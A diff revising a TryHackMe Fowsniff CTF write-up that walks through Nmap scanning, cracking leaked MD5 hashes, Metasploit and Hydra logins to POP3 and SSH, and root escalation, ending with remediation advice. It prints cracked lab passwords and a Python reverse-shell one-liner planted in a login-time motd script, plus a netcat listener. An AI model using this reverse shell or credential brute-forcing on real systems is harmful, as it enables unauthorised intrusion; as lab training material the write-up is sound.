@@ -2,84 +2,148 @@
 
 ## Overview
 
-This writeup documents my methodology for completing the Fowsniff CTF room on TryHackMe.
+This writeup documents the methodology for completing the Fowsniff CTF room on TryHackMe.
 
 - **Platform:** TryHackMe
 - **Difficulty:** Easy
 - **Room:** Fowsniff
-- **Tools used:** Nmap
+- **Tools used:** Nmap, Metasploit, Hydra, Netcat
 
 ## Reconnaissance and Scanning
-Deployed the machine and I began with an Nmap service and default-script scan to identify the target's exposed services.
 
-bash command
+Deployed the machine and began with an Nmap service and default-script scan to identify the target's exposed services.
+
+```bash
 nmap -sC -A 10.82.166.8 -oN fowSniff.txt
+```
 
-Open Ports (refer to: 01-nmap-scan)
-Port	Service	   Version
-22	  SSH	       OpenSSH 7.2p2
-80	  HTTP	     Apache 2.4.18
-110	  POP3	     Dovecot
-143	  IMAP	     Dovecot
+**Open Ports** (refer to: `01-nmap-scan`)
+
+| Port | Service | Version        |
+|------|---------|----------------|
+| 22   | SSH     | OpenSSH 7.2p2  |
+| 80   | HTTP    | Apache 2.4.18  |
+| 110  | POP3    | Dovecot        |
+| 143  | IMAP    | Dovecot        |
 
 ## Web Enumeration
-1) Based on inspection a web server is running on port 80 (refer to: 02-webserver
-2) Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
-https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt
+
+1. Based on inspection, a web server is running on port 80 (refer to: `02-webserver`).
+2. Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords: [github.com/berzerk0/Fowsniff](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt)
 
 ## Credential Analysis
-1)We copied the contents of leaked database into a .txt file named fowsniff_leaked.txt
-command: nano fowsniff_leaked.txt
 
-2) Used the command "sed -n 's/.*://p' fowsniff_leaked.txt > hashes.txt" to keep only the hashes.
+1. Copied the contents of the leaked database into a `.txt` file named `fowsniff_leaked.txt`:
+   ```bash
+   nano fowsniff_leaked.txt
+   ```
+2. Used the following command to keep only the hashes:
+   ```bash
+   sed -n 's/.*://p' fowsniff_leaked.txt > hashes.txt
+   ```
+3. The passwords are MD5 hashes. Using (https://hashes.com/en/decrypt/hash), we decoded/cracked 8 out of 9 hashed passwords:
 
-The passwords are MD5 hashes, by using "https://hashes.com/en/decrypt/hash" we decoded/cracked 8 out of 9 hashed passwords
-0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
-19f5af754c31f1e2651edde9250d69bb:skyler22
-1dc352435fecca338acfd4be10984009:apples01
-4d6e42f56e127803285a0a7649b5ab11:orlando12
-8a28a94a588a95b80163709ab4313aa4:mailcall
-90dc16d47114aa13671c697fd506cf26:scoobydoo2
-ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
-f7fd98d380735e859f8b2ffbbede5a7e:07011972
+   ```
+   0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
+   19f5af754c31f1e2651edde9250d69bb:skyler22
+   1dc352435fecca338acfd4be10984009:apples01
+   4d6e42f56e127803285a0a7649b5ab11:orlando12
+   8a28a94a588a95b80163709ab4313aa4:mailcall
+   90dc16d47114aa13671c697fd506cf26:scoobydoo2
+   ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
+   f7fd98d380735e859f8b2ffbbede5a7e:07011972
+   ```
 
-3)Proceeded by creating two files one for the users and one for passwords
-
-To create a users file we have used the command (Refer to: 
-
-To create a password file we have used the command (Refer to: 
+4. Proceeded by creating two files, one for usernames and one for passwords:
+   - Users file (refer to: `06a - Creating users file`)
+   - Passwords file (refer to: `06b - Creating pass file`)
 
 ## POP3 Enumeration
-1) Following room instructions we launched Metasploit from terminal by using the command "msfconsole"
-2) As we saw before a pop3 is open, hence we have searched for pop3 exploit available by searching "search pop3"
-3) We saw the exploit "auxiliary/scanner/pop3/pop3_login" as guided by the room instructions, hence we proceeded by selecting it by using the command "USE 3"
-4) By running the command we identified a successful login
-10.82.166.8:110       - 10.82.166.8:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '
+1. Following room instructions, launched Metasploit from the terminal:
+   ```bash
+   msfconsole
+   ```
+2. Since POP3 was open, searched for a relevant exploit (refer to: 07a - Metasploit_search)
+   ```
+   search pop3
+   ```
+3. Selected the `auxiliary/scanner/pop3/pop3_login` module as guided by the room instructions and proceeded by configuring it (refer to: 07b - Metasploit_conf_exploit)
+   ```
+   use auxiliary/scanner/pop3/pop3_login
+   ```
+4. Running the module identified a successful login (refer to: 07c - Metasploit successful login)
+   ```
+   10.82.166.8:110 - 10.82.166.8:110 - Success: 'seina:scoobydoo2' '+OK Logged in.'
+   ```
 
 ## Initial Access
-1) By using the command nc fowsniff10.82.166.8 110 we connected to pop3 by using credentials
-> USER seina
-> PASS scoobydoo2
-> LIST -> Retrieve messages
-> RETR 1 OR 2 to read messages
 
-By reading message 1 we found an ssh password temp "S1ck3nBluff+secureshell". 
-To identify the user that correlated to the specific password we have used hydra tool by running the command below:
-hydra -L  users.txt -p S1ck3nBluff+secureshell ssh://10.82.166.8
+1. Connected to POP3 using the discovered credentials:
+   ```bash
+   nc 10.82.166.8 110
+   ```
+   ```
+   USER seina
+   PASS scoobydoo2
+   LIST          # Retrieve messages
+   RETR 1        # Read message 1 (or 2, etc.)
+   ```
+2. Reading message 1 revealed a temporary SSH password
 
-User Identified: baksteen
-pass: S1ck3nBluff+secureshell
+3. To identify which user the password belonged to, we ran Hydra against the SSH service (refer to: 08 - Hydra finding user)
+   ```bash
+   hydra -L users.txt -p "insert password" ssh://10.82.166.8
+   ```
 
 ## Privilege Escalation
-by logging into ssh we then:
-1) Proceeded to check which groups the user belongs too
-2) Identified a file that can run by them by running the command find /  -group users -type f 2>/dev/null
-3) We navigate to the specific folder to run the command
 
+After logging in via SSH 
 
+1. Checked which groups the user belongs to by running the command id
+2. Ran the following command to identify files that can be executed by this user:
+   ```bash
+   find / -group users -type f 2>/dev/null
+   ```
+   This identified `cube.sh` as a file the user could run (refer to: 09 - SSH login)
+3. Navigated to the relevant directory and opened the file with a text editor to insert a reverse shell, as instructed by the room guide:
+   ```python
+   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("insert your IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+   ```
+   
+   This file is included in `/etc/update-motd.d/`, so on the next startup / SSH connection, it triggers a reverse shell.
+4. Set up a Netcat listener to catch the incoming connection (refer to: 11 - Reverse shell)
+   ```bash
+   nc -lvnp 1234
+   ```
+5. Connection established — running `whoami` confirmed root access.
 
 ## Findings and Remediation
 
+## Findings and Remediation
+
+- **Public credential leak:** Employee usernames and MD5 password hashes were publicly available.  
+  **Remediation:** Remove exposed data, reset affected passwords, and investigate for unauthorized access.
+
+- **Weak password hashing:** MD5 hashes were cracked easily.  
+  **Remediation:** Store passwords with a modern salted hashing algorithm such as Argon2id, bcrypt, or scrypt.
+
+- **Password reuse:** A leaked password authenticated to the POP3 service, while information found in email led to valid SSH access.  
+  **Remediation:** Enforce unique passwords, strong password policies, and multi-factor authentication.
+
+- **Insecure file permissions:** A script executed during SSH login was writable by a non-privileged group, allowing escalation to root.  
+  **Remediation:** Ensure scripts in `/etc/update-motd.d/` are owned by `root` and writable only by `root`.
+
 ## Lessons Learned
 
+- Publicly leaked information can be used to gain access to internal services.
+- Cracked credentials should be tested against services identified during enumeration.
+- POP3 emails may contain additional credentials or internal operational information.
+- Linux group permissions can be as important as file ownership during privilege-escalation enumeration.
+- Automatically executed system scripts should always have strict ownership and permissions.
+
 ## References
+
+- [TryHackMe](https://tryhackme.com/)
+- [Fowsniff leaked credentials file](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt)
+- [Nmap documentation](https://nmap.org/book/man.html)
+- [Metasploit Framework documentation](https://docs.metasploit.com/)
